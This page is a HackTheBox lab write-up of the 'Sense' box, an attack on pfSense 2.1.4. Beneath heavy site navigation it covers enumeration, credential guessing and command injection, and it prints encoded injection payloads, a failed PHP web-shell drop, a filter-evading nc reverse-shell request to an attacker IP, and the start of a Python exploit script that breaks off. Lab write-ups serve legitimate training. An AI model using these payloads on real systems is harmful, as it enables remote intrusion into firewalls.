@@ -1,0 +1,956 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Pwny_Sec</title>
+    
+      <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="revised" content="2019-09-02T23:18:39 EDT">
+<title>Sense :: Pwny_Sec</title>
+<link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
+<link href="/css/font-awesome.min.css" rel="stylesheet">
+<link href="/css/nucleus.css" rel="stylesheet">
+<link href="/theme-flex/style.css" rel="stylesheet">
+
+	<link href="/theme-flex/variant-red.css" rel="stylesheet">
+
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<script src="/js/jquery-2.x.min.js"></script>
+<script type="text/javascript">
+      var baseurl = "\/";
+</script>
+<meta name="description" content="">
+
+
+
+    
+  </head>
+  <body data-url="/hackthebox/boxes/sense/">
+    
+      <header>
+  <div class="logo">
+    
+
+
+
+
+<h2 id="pwny-sec">Pwny_Sec</h2>
+
+
+
+
+  </div>
+  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
+    <nav class="shortcuts">
+            <li class="" role="">
+                <a href="https://twitter.com/pwny_sec"  rel="noopener">
+                  <i class='fa fa-twitter'></i> <label>Twitter</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://github.com/vjeantet/hugo-theme-docdock"  rel="noopener">
+                  <i class='fa fa-github'></i> <label>Github repo</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://chickenpwny.github.io/images/meme/raw.gif"  rel="noopener">
+                  <i class='fa fa-cloud-download'></i> <label>Download</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="#"  rel="noopener">
+                  <i class='fa fa-bookmark'></i> <label>Book Mark</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="/credits"  rel="noopener">
+                  <i class='fa fa-bullhorn'></i> <label>Credits</label>
+                </a>
+            </li>
+    </nav>
+</header>
+<article>
+  <aside>
+    <ul class="menu">
+<a href="http://chickenpwny.github.io"><img src="/images/meme/home.jpg" alt="Alternate Text" style="width:45%;margin-left:auto;margin-right:auto;border-radius:50%;display:block;" alt="Home" /></a>
+<li data-nav-id="/concepts/" class="dd-item haschildren
+        ">
+    <div>
+        <a href="/concepts/">Concept</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/concepts/dll/" class="dd-item">
+    <div>
+        <a href="/concepts/dll/">
+            DLL_CraFt&amp;BreW
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/file-transfer/" class="dd-item">
+    <div>
+        <a href="/concepts/file-transfer/">
+            File Transfer
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
+        ">
+    <div>
+        <a href="/concepts/webapppentest/">WebAppPenTests</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/concepts/webapppentest/lfi/" class="dd-item
+        ">
+    <div>
+        <a href="/concepts/webapppentest/lfi/"> Local File inclusion</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/heartbld/" class="dd-item
+        ">
+    <div>
+        <a href="/concepts/webapppentest/heartbld/">HeartBleed</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/osinjcmd/" class="dd-item
+        ">
+    <div>
+        <a href="/concepts/webapppentest/osinjcmd/">OS Command Injection</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/phptypejuggling/" class="dd-item
+        ">
+    <div>
+        <a href="/concepts/webapppentest/phptypejuggling/">PHP Typw Juggling</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/concepts/bypass/" class="dd-item">
+    <div>
+        <a href="/concepts/bypass/">
+            Windows-Bypass
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/" class="dd-item parent haschildren
+        ">
+    <div>
+        <a href="/hackthebox/">HackTheBox</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/" class="dd-item parent haschildren
+        ">
+    <div>
+        <a href="/hackthebox/boxes/">Boxes</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/hawk/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/hawk/"></a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/arkham/" class="dd-item haschildren
+        ">
+    <div>
+        <a href="/hackthebox/boxes/arkham/">Arkhams</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/arkham/writeup/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/arkham/writeup/">ARKHAM-writeup</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/arkham/notes/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/arkham/notes/">arkham notes</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/boxes/blue/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/blue/">Blue</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/chaos-og/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/chaos-og/">
+            CHAOS
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/inusectf/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/inusectf/">
+            CTF
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/carrier/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/carrier/">
+            Carrier
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/carrier-root/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/carrier-root/">
+            CarrierRoot
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/crimestoppers/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/crimestoppers/">CrimeStopper</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/devel/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/devel/">
+            Devel
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/ethereal/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/ethereal/">
+            Ethereal
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/flujab/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/flujab/">
+            Flujab
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/friendzone/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/friendzone/">
+            FriendZone
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/grand-pa/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/grand-pa/">
+            GrandMa
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/helpline/" class="dd-item haschildren
+        ">
+    <div>
+        <a href="/hackthebox/boxes/helpline/">Helplines</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/helpline/writeup/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/helpline/writeup/">HelpLine-WriteUp</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/helpline/notes/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/helpline/notes/">Helpdesk-Notes</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/boxes/legacy/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/legacy/">Legacy</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/lightweight/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/lightweight/">
+            LightWeight
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/mischief/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/mischief/">Mischief</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/help/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/help/">Network Manager Down</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/help/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/help/">
+            Network Manager Down
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/optimum/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/optimum/">
+            Optimum
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/poison/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/poison/">Poison</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/secnotes/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/secnotes/">SecNotes</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/sense/" class="dd-item active">
+    <div>
+        <a href="/hackthebox/boxes/sense/">
+            Sense
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/sizzle/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/sizzle/">
+            Sizzle
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/gold-sizzle/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/gold-sizzle/">
+            Sizzle-Gold
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/sneaky/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/sneaky/">
+            Sneaky
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/valentine/">Valentine</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/vault/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/vault/">
+            Vault
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/waldo/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/waldo/">Waldo</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/zipper/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/zipper/">Zipper</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/oz/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/oz/">oz</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/sunday/" class="dd-item
+        ">
+    <div>
+        <a href="/hackthebox/boxes/sunday/">sunday</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/teacher/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/teacher/">
+            teacher
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/github/" class="dd-item haschildren
+        ">
+    <div>
+        <a href="/hackthebox/github/">GitHub</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/github/hugopowershell/" class="dd-item">
+    <div>
+        <a href="/hackthebox/github/hugopowershell/">
+            Hugo/Github/Power
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/challenges/" class="dd-item haschildren
+        ">
+    <div>
+        <a href="/hackthebox/challenges/">Miscellaneous</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/challenges/bloodhound/" class="dd-item">
+    <div>
+        <a href="/hackthebox/challenges/bloodhound/">
+            
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/tmux/" class="dd-item">
+    <div>
+        <a href="/hackthebox/tmux/">
+            TMUX
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/linux/" class="dd-item haschildren
+        ">
+    <div>
+        <a href="/linux/">Linuxes</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/linux/ftp/" class="dd-item">
+    <div>
+        <a href="/linux/ftp/">
+            FTP
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/linux/filetransfer/" class="dd-item">
+    <div>
+        <a href="/linux/filetransfer/">
+            File Transfer
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/linux/netcat/" class="dd-item
+        ">
+    <div>
+        <a href="/linux/netcat/">NetCat PORT SCAN</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/linux/nmap/" class="dd-item">
+    <div>
+        <a href="/linux/nmap/">
+            Nmap
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/linux/snmpwalk/" class="dd-item
+        ">
+    <div>
+        <a href="/linux/snmpwalk/">SNMPWalk</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/linux/tunneling/" class="dd-item">
+    <div>
+        <a href="/linux/tunneling/">
+            Tunnels
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/linux/ssh/" class="dd-item">
+    <div>
+        <a href="/linux/ssh/">
+            ssh
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/webapp/" class="dd-item haschildren
+        ">
+    <div>
+        <a href="/webapp/">WebApps</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/webapp/burp/" class="dd-item haschildren
+        ">
+    <div>
+        <a href="/webapp/burp/">Burp</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/webapp/burp/burp/" class="dd-item">
+    <div>
+        <a href="/webapp/burp/burp/">
+            Burp
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/webapp/gobuster/" class="dd-item">
+    <div>
+        <a href="/webapp/gobuster/">
+            GoBuster
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/webapp/hydra/" class="dd-item">
+    <div>
+        <a href="/webapp/hydra/">
+            Hydra
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/webapp/skipfish/" class="dd-item
+        ">
+    <div>
+        <a href="/webapp/skipfish/">SkipFish</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/webapp/sqlmap/sqlmap/" class="dd-item">
+    <div>
+        <a href="/webapp/sqlmap/sqlmap/">
+            SqlMap
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/webapp/wfuzz/" class="dd-item
+        ">
+    <div>
+        <a href="/webapp/wfuzz/">WFuzz</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/windows/" class="dd-item haschildren
+        ">
+    <div>
+        <a href="/windows/">Windows</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/windows/bloodhound/" class="dd-item">
+    <div>
+        <a href="/windows/bloodhound/">
+            BloodHound Neo4j
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/windows/chisel/" class="dd-item">
+    <div>
+        <a href="/windows/chisel/">
+            ChiselTunnel
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/windows/filetransfer/" class="dd-item">
+    <div>
+        <a href="/windows/filetransfer/">
+            File Transfer
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/windows/linux-smb-enum/" class="dd-item">
+    <div>
+        <a href="/windows/linux-smb-enum/">
+            SMB
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/windows/smb/" class="dd-item">
+    <div>
+        <a href="/windows/smb/">
+            SMB-KALI
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/windows/windows_enum/" class="dd-item">
+    <div>
+        <a href="/windows/windows_enum/">
+            Windows
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+
+
+
+    </ul>
+    <section>
+    </section>
+  </aside>
+  <section class="page">
+    
+    <div class="nav-select">
+      <center>Navigation : 
+        <select onchange="javascript:location.href = this.value;">
+          
+    <option value="/concepts/" >
+   Concept</option>
+    <option value="/hackthebox/" >
+   HackTheBox</option> 
+    <option value="/hackthebox/boxes/" >
+  - 
+   Boxes</option> 
+    <option value="/hackthebox/boxes/hawk/" >
+  -- 
+   </option>
+    <option value="/hackthebox/boxes/arkham/" >
+  -- 
+   Arkhams</option>
+    <option value="/hackthebox/boxes/blue/" >
+  -- 
+   Blue</option>
+      <option value="/hackthebox/boxes/chaos-og/" >-- CHAOS</option>
+      <option value="/hackthebox/boxes/inusectf/" >-- CTF</option>
+      <option value="/hackthebox/boxes/carrier/" >-- Carrier</option>
+      <option value="/hackthebox/boxes/carrier-root/" >-- CarrierRoot</option>
+    <option value="/hackthebox/boxes/crimestoppers/" >
+  -- 
+   CrimeStopper</option>
+      <option value="/hackthebox/boxes/devel/" >-- Devel</option>
+      <option value="/hackthebox/boxes/ethereal/" >-- Ethereal</option>
+      <option value="/hackthebox/boxes/flujab/" >-- Flujab</option>
+      <option value="/hackthebox/boxes/friendzone/" >-- FriendZone</option>
+      <option value="/hackthebox/boxes/grand-pa/" >-- GrandMa</option>
+    <option value="/hackthebox/boxes/helpline/" >
+  -- 
+   Helplines</option>
+    <option value="/hackthebox/boxes/legacy/" >
+  -- 
+   Legacy</option>
+      <option value="/hackthebox/boxes/lightweight/" >-- LightWeight</option>
+    <option value="/hackthebox/boxes/mischief/" >
+  -- 
+   Mischief</option>
+    <option value="/hackthebox/boxes/help/" >
+  -- 
+   Network Manager Down</option>
+      <option value="/hackthebox/boxes/help/" >-- Network Manager Down</option>
+      <option value="/hackthebox/boxes/optimum/" >-- Optimum</option>
+    <option value="/hackthebox/boxes/poison/" >
+  -- 
+   Poison</option>
+    <option value="/hackthebox/boxes/secnotes/" >
+  -- 
+   SecNotes</option>
+      <option value="/hackthebox/boxes/sense/"  selected>-- Sense</option>
+      <option value="/hackthebox/boxes/sizzle/" >-- Sizzle</option>
+      <option value="/hackthebox/boxes/gold-sizzle/" >-- Sizzle-Gold</option>
+      <option value="/hackthebox/boxes/sneaky/" >-- Sneaky</option>
+    <option value="/hackthebox/boxes/valentine/" >
+  -- 
+   Valentine</option>
+      <option value="/hackthebox/boxes/vault/" >-- Vault</option>
+    <option value="/hackthebox/boxes/waldo/" >
+  -- 
+   Waldo</option>
+    <option value="/hackthebox/boxes/zipper/" >
+  -- 
+   Zipper</option>
+    <option value="/hackthebox/boxes/oz/" >
+  -- 
+   oz</option>
+    <option value="/hackthebox/boxes/sunday/" >
+  -- 
+   sunday</option>
+      <option value="/hackthebox/boxes/teacher/" >-- teacher</option>
+  
+    <option value="/hackthebox/github/" >
+  - 
+   GitHub</option>
+    <option value="/hackthebox/challenges/" >
+  - 
+   Miscellaneous</option>
+      <option value="/hackthebox/tmux/" >- TMUX</option>
+  
+    <option value="/linux/" >
+   Linuxes</option>
+    <option value="/webapp/" >
+   WebApps</option>
+    <option value="/windows/" >
+   Windows</option>
+
+
+
+        </select>
+      </center>
+    </div>
+      <div>
+        <div class="searchbox">
+          <input data-search-input id="search-by" type="text" placeholder="Search...">
+        </div>
+        <script type="text/javascript" src="/js/lunr.min.js"></script>
+        <script type="text/javascript" src="/js/auto-complete.js"></script>
+        <link href="/css/auto-complete.css" rel="stylesheet">
+        <script type="text/javascript">
+          
+              var baseurl = "\/";
+          
+        </script>
+        <script type="text/javascript" src="/js/search.js"></script>
+      </div>
+    
+
+    <h1>Sense</h1>
+    
+    
+    
+    <p>Sense, well be attacking pfsense 2.14 which has a couple of vulnerabilities, pfsense will block you for 24 hours if it detects brute forcing or 15 failed login attempts. To get around this ippsec tunnel through another machine enumerated that way. Using a web directory fuzzer will find two text files that offer some clues to the cmd injection exploit, and the username. I suppose were suppose to guess the password is still pfsense when the username is changed but oh well.</p>
+
+<p><strong>Getting around being banned</strong></p>
+
+<p>SSH* Bind Port This will create a connection on the host 8080, This type of connection is limited it works on the application-level of the osi model. it works by assigning a socket to listen to the desired port. Any connection made to the port on the host is forward to our host. ssh will act as a SOCKS server. This is different that port forwarding -L. We can use this to tunnel to burp or use another application.</p>
+
+<pre><code>ssh -D8080 user@ipaddress 
+</code></pre>
+
+<p><strong>Gobuster</strong> For gobuster i had to use the medium list the small list didn&rsquo;t catch <mark>/system-users.txt</mark>. where you will find the hint for the username <mark>rohit</mark></p>
+
+<pre><code>/opt/gobuster/gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.60/ -k -x txt,php,html 
+-x File extentions
+-k ignore https cert errors. 
+-w wordlist
+-u url or uri
+dir specify the mode we want gobuster to run in. 
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/sense/gobuster.PNG" alt="gobuster" /></p>
+
+<p><strong>HINTS</strong> User: rohit   Pass: pfsnese (guess)</p>
+
+<p><img src="https://chickenpwny.github.io/images/sense/HITNS2.PNG" alt="HITNS2" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/sense/HITNS.PNG" alt="HITNS" /></p>
+
+<p><strong>Failures Begin</strong></p>
+
+<p>The hints basically force you to brute force, not many of the wordlist have pfsense in them if they do it&rsquo;s way down the table. This much have been by design to force more critical thinking and atleast a basic understanding of pfsense. The default credentials for pfsense are <mark>user : admin  pass: pfsense </mark>.</p>
+
+<p><strong>CHECK THE TLS CERT</strong></p>
+
+<p>It&rsquo;s typically a good idea to check certs for information you might get a username or a different domain. ;) There isn&rsquo;t thing of importance here this time.</p>
+
+<p><img src="https://chickenpwny.github.io/images/sense/TLS-cert.PNG" alt="TLS-cert" /></p>
+
+<p><strong>This was the BURP CERT</strong> make sure in the sure chickenpwny to turn off burp when getting the cert so you can look at the websites cert not burps.</p>
+
+<p><img src="https://chickenpwny.github.io/images/sense/TLS-cert2.PNG" alt="TLS-cert2" /></p>
+
+<p><em>REAL CERT</em></p>
+
+<p><img src="C:HugositesblogstaticimagessenseTLS-cert3.PNG" alt="TLS-cert3" /></p>
+
+<p><strong>IPPSEC BRUTEFORCER PFSENSE</strong></p>
+
+<p>So, pfsense use a csrf token to prevent crossite forgery an attempt to verify each action taken is done by the intended user. Lets investigate this further see whats going on with the csrf token. The token is composed of three parts the sid a hash and then i suppose a salt it at the end separated by a comma. Im not totally sure what the last string is for.</p>
+
+<p><img src="https://chickenpwny.github.io/images/sense/login-request.PNG" alt="login-request" /></p>
+
+<p>The string is url encoded, then base64 encoded. notice how it turns into a bunch of characters. The string in the middle is the hash, i want to say the last part has something to do with the session, not a salt. ooooh oh oh oh, its the <mark> cookie_test</mark></p>
+
+<p><img src="https://chickenpwny.github.io/images/sense/login-request2.PNG" alt="login-request2" /></p>
+
+<p>When we write the script will need to get <mark>__csrf_magic</mark></p>
+
+<p><strong>Enviroment Variables</strong></p>
+
+<p>I believe there is quiet a bit of filtering going on here. as certain characters disappears. some commands are filtered out, i believe to prevent exploitation of these vulnerabilities. For example <mark>printenv</mark> does not print the environment variables but <mark> env</mark> does print the variables. forward slashes seem to be taken away aswell as { some other characters. i first noticed this when i was trying to upload my simple-phpbackdoor { } and request was removed. im sure what actually might have caused this it is only assumption up to this point.</p>
+
+<p>I suppose it&rsquo;s safe to assume we start in /usr/local/www but you never know. I couldn&rsquo;t get it to work i tried playing around with see if i could do something else. The guides all backout three directories. I tried to get a reverse shell using python, bash, php was blocked couldn&rsquo;t get anything to run. I got stumped and went to ippsec video to see how he got around this, by using environment variables.</p>
+
+<p>This will echo the command whoami am into pinkie.txt. play around with commands and see what you can run.</p>
+
+<pre><code>queues;cd+..%3bcd+..%3bcd+..%3bcd+usr%3bcd+local%3bcd+www%3becho+&quot;whoami&quot;&gt;pinkie.txt
+</code></pre>
+
+<p>To get the environment variables, this is where i began to notice there&rsquo;s a filter in place. <mark>printenv</mark> should print the variables to pinkie.txt. it does though, i tried moving over php script that gives cmd injection when it echo&rsquo;s the content its missing something. perhaps it&rsquo;s reading those characters they should should in a .txt file. who knows i dont.</p>
+
+<pre><code>queues;cd+..%3bcd+..%3bcd+..%3bcd+usr%3bcd+local%3bcd+www%3benv+&gt;pinkie.txt
+queues;cd+..%3bcd+..%3bcd+..%3bcd+usr%3bcd+local%3bcd+www%3becho+&quot;$PWD&quot;&gt;pinkie.txt
+
+
+#FAILED#  queues;cd+..%3bcd+..%3bcd+..%3bcd+usr%3bcd+local%3bcd+www%3becho+&quot;&lt;%3fphp+system($REQUEST['CMD'])%3b%3f&gt;&quot;&gt;pinkie.php
+#failed# queues;cd+..%3bcd+..%3bcd+..%3bcd+usr%3bcd+local%3bcd+www%3bprintenv+&gt;pinkie.txt
+#failed# queues;touch+chicken.txt
+#FAILED#  queues;cd+..%3bcd+..%3bcd+..%3bcd+usr%3bcd+local%3bcd+www%3print+$PWD+&gt;pinkie.txt
+</code></pre>
+
+<p><img src="https://i.ytimg.com/vi/U8xcZM4Z6pY/maxresdefault.jpg" alt="Image result for mlp question marks" /></p>
+
+<p>We have established we can get some commands to run and get the output back. With some minor changes to the rm netcat shell. There more than a couple ways to get a shell. the simplest is the net rm shell. python revse shell is an options i tried to make a script using both but it messes up some how. i think it works but the command isn&rsquo;t getting read because it&rsquo;s not encoded or whatever. which leads to maybe using the octal thing to bypass that. pretty sure it&rsquo;s url encoded. Ippsec in his video pointed the script to burp which isn&rsquo;t that bad of a idea for testing out a pythons script.</p>
+
+<p>Why, well i couldn&rsquo;t get it to work /sobs. The scripts i found eploiting this used converting the string to octal to bypass the filter or whatever.</p>
+
+<pre><code>GET /status_rrd_graph_img.php?database=queues;x%3d$(printf+&quot;\\55&quot;)%3brm+${HOME}tmp${HOME}f%3bmkfifo+${HOME}tmp${HOME}f%3bcat+${HOME}tmp${HOME}f|${HOME}bin${HOME}sh+${x}i+2&gt;%261|nc+10.10.14.2+9135&gt;${HOME}tmp${HOME}f HTTP/1.1
+nc -lvnp 9135
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/sense/root.PNG" alt="root" /></p>
+
+<p>**to infinity and beyond **</p>
+
+<pre><code>#!/usr/bin/env python3                                                                                                                                  
+                                                                                                                                                        
+import requests                                                                                                                                         
+from requests.packages.urllib3.exceptions import InsecureRequestWarning                                                                                 
+import re                                                                                                                                               import argparse                       
+import urllib                                                               
+import urllib3      
+                                                                            
+#Parse Arguements                                                                                                                                       
+parser = argparse.ArgumentParser()                                                                                                                      
+parser.add_argument(&quot;-rhost&quot;, help = &quot;Remote Host&quot;)                         
+parser.add_argument(&quot;-lhost&quot;, help = &quot;Local Host use ifconfig to get the localhost&quot;)                           
+parser.add_argument(&quot;-lport&quot;, help = &quot;Local Port examples, 80,443,53,161&quot;)  
